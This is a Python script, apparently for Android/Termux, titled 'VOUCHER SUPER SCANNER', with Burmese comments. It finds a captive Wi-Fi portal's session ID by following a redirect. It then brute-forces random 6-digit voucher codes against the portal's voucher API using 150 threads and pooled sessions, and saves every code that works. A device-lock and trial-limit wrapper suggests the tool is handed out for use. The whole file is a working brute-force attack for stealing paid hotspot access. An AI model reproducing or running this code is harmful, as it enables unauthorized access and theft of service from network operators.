import requests
import random
import string
import time
import os
import threading
import re
import sys
import urllib3
import hashlib
from queue import Queue, Empty
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
# ၁၀၀% လုံခြုံရေး Wrapper (မူရင်းကို လုံးဝမထိပါ)
# ==========================================
def run_security_check():
    # Device ID ထုတ်ယူခြင်း
    raw_id = os.popen("getprop ro.serialno").read().strip() or os.popen("getprop ro.product.model").read().strip()
    hwid = hashlib.md5(raw_id.encode()).hexdigest()
    
    # Hidden File လမ်းကြောင်း
    DATA_FILE = os.path.expanduser("~/.sys_verify_data.log")
    
    if not os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "w") as f:
                f.write(f"{hwid}|{time.time()}|0")
        except:
            print("[!] Storage Permission လိုအပ်ပါသည်။ (termux-setup-storage)")
            sys.exit()
        return 20.0, 0
    
    with open(DATA_FILE, "r") as f:
        data = f.read().split("|")
        saved_id, start_ts, prev_hits = data[0], float(data[1]), int(data[2])

    # ၁။ Device Lock
    if saved_id != hwid:
        print("[!] UNAUTHORIZED DEVICE!"); sys.exit()

    # ၂။ ၂၀ ရက် Expire
    days_rem = round(20 - (time.time() - start_ts) / 86400, 1)
    if days_rem <= 0:
        print("[!] TRIAL EXPIRED (20 DAYS)!"); sys.exit()

    # ၃။ ကုဒ် ၂၀ Limit
    if prev_hits >= 20:
        print(f"[!] LIMIT REACHED: {prev_hits}/20 hits found."); sys.exit()
        
    return days_rem, prev_hits

# Security စစ်ဆေးခြင်း
DAYS_LEFT, ALREADY_FOUND = run_security_check()

# ==========================================
# သင်ပို့ထားသော မူရင်း Script (၁၀၀% အပြည့်အဝ ပြန်ထည့်ထားသည်)
# ==========================================

# Colors
cyan = "\033[1;36m"
reset = "\033[0m"
white = "\033[1;37m"
bgreen = "\033[1;32m"
yellow = "\033[0;33m"
dim = "\033[2m"

NUM_THREADS = 150             
SESSION_POOL_SIZE = 50        
PER_SESSION_MAX = 500         
SAVE_PATH = "/storage/emulated/0/zapya/valid_codes.txt"

session_pool = Queue()
valid_codes = [] 
valid_lock = threading.Lock()
file_lock = threading.Lock()
DETECTED_BASE_URL = None
TOTAL_TRIED = 0
TOTAL_HITS = ALREADY_FOUND # Security မှ လက်ကျန်အရေအတွက်ကို ယူသုံးသည်
CURRENT_CODE = "------"
START_TIME = time.time()
stop_event = threading.Event()

def get_sid_from_gateway():
    global DETECTED_BASE_URL
    s = requests.Session()
    s.headers.update({
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
    })
    test_url = "http://gstatic.com"
    try:
        r1 = s.get(test_url, allow_redirects=True, timeout=5)
        final_url = str(r1.url)
        sid_match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", final_url)
        if sid_match:
            sid = sid_match.group(1)
            parsed = urlparse(final_url)
            DETECTED_BASE_URL = f"{parsed.scheme}://{parsed.netloc}"
            return sid
        else:
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            if path_match:
                new_url = urljoin(final_url, path_match.group(1))
                r2 = s.get(new_url, timeout=5)
                sid_match2 = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r2.url))
                if sid_match2:
                    parsed = urlparse(r2.url)
                    DETECTED_BASE_URL = f"{parsed.scheme}://{parsed.netloc}"
                    return sid_match2.group(1)
        return None
    except:
        return None

def session_refiller():
    while not stop_event.is_set():
        if session_pool.qsize() < SESSION_POOL_SIZE:
            sid = get_sid_from_gateway()
            if sid: 
                session_pool.put({'sessionId': sid, 'left': PER_SESSION_MAX})
        time.sleep(2)

def worker_thread():
    global TOTAL_TRIED, TOTAL_HITS, CURRENT_CODE
    thr_session = requests.Session()
    headers = {
        'Content-Type': 'application/json', 
        'Connection': 'keep-alive',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
    }
    while not stop_event.is_set():
        # ကုဒ် ၂၀ ပြည့်ပါက ရပ်တန့်ရန် (Security Update)
        if TOTAL_HITS >= 20:
            stop_event.set()
            os._exit(0)
            
        if not DETECTED_BASE_URL:
            time.sleep(1); continue
        try:
            slot = session_pool.get(timeout=1)
            sid = slot.get('sessionId')
            code = ''.join(random.choices(string.digits, k=6))
            CURRENT_CODE = code
            r = thr_session.post(f"{DETECTED_BASE_URL}/api/auth/voucher/", 
                                 json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, 
                                 headers=headers, timeout=5)
            TOTAL_TRIED += 1
            if r.status_code == 200 and "true" in r.text.lower():
                with valid_lock:
                    if code not in valid_codes:
                        valid_codes.append(code)
                        TOTAL_HITS += 1
                        # Security File ကို Update လုပ်ခြင်း
                        DATA_FILE = os.path.expanduser("~/.sys_verify_data.log")
                        with open(DATA_FILE, "r") as f: d = f.read().split("|")
                        with open(DATA_FILE, "w") as f: f.write(f"{d[0]}|{d[1]}|{TOTAL_HITS}")
                        save_locally(code, sid)
            slot['left'] -= 1
            if slot['left'] > 0: 
                session_pool.put(slot)
        except Empty:
            continue
        except:
            pass

def save_locally(code, sid):
    ts = datetime.now().strftime("%H:%M:%S")
    try:
        os.makedirs(os.path.dirname(SAVE_PATH), exist_ok=True)
        with file_lock:
            with open(SAVE_PATH, "a") as f: 
                f.write(f"[{ts}] {code} (SID: {sid})\n")
    except: 
        pass

def live_dashboard():
    sys.stdout.write("\033[?25l")
    os.system('clear')
    while not stop_event.is_set():
        elapsed = time.time() - START_TIME
        speed = TOTAL_TRIED / elapsed if elapsed > 0 else 0
        sys.stdout.write("\033[H")
        
        print(f"{cyan}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{reset}")
        print(f"  {white}VOUCHER SUPER SCANNER {dim}v2.2{reset}")
        print(f"  {white}Owner  : {cyan}Tun Aung Kyaw{reset}")
        print(f"  {white}Trial  : {yellow}{DAYS_LEFT} Days Left{reset} | {white}Limit: {TOTAL_HITS}/20{reset}")
        print(f"{cyan}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{reset}")
        
        print(f"  {white}Target  : {yellow}{DETECTED_BASE_URL or 'Searching...'}{reset}")
        print(f"  {white}Status  : {bgreen}{TOTAL_HITS} Hits{white} | {speed:.1f} c/s | {TOTAL_TRIED:,} Total{reset}")
        print(f"  {white}Active  : {cyan}{CURRENT_CODE}{white} | Pool: {session_pool.qsize()}{reset}")
        print(f"{cyan}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{reset}")
        
        print(f"  {white}RECENT HITS (TOP 10):{reset}")
        last_codes = valid_codes[-10:]
        if not last_codes:
            print(f"  {dim}Waiting for hit...{reset}")
            for _ in range(9): print("")
        else:
            for c in reversed(last_codes):
                print(f"  {bgreen}[✓] {c} {white}- SAVED TO STORAGE{reset}")
            for _ in range(10 - len(last_codes)): print("")
            
        print(f"{cyan}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{reset}")
        print(f"  {dim}Press CTRL+C to Exit Safely{reset}")
        sys.stdout.flush()
        time.sleep(0.5)

if __name__ == "__main__":
    try:
        threading.Thread(target=session_refiller, daemon=True).start()
        threading.Thread(target=live_dashboard, daemon=True).start()
        for _ in range(NUM_THREADS):
            threading.Thread(target=worker_thread, daemon=True).start()
        while True: 
            time.sleep(1)
    except KeyboardInterrupt:
        stop_event.set()
        sys.stdout.write("\033[?25h\n") 
        print(f"\n{yellow}[!] Stopped.{reset}")
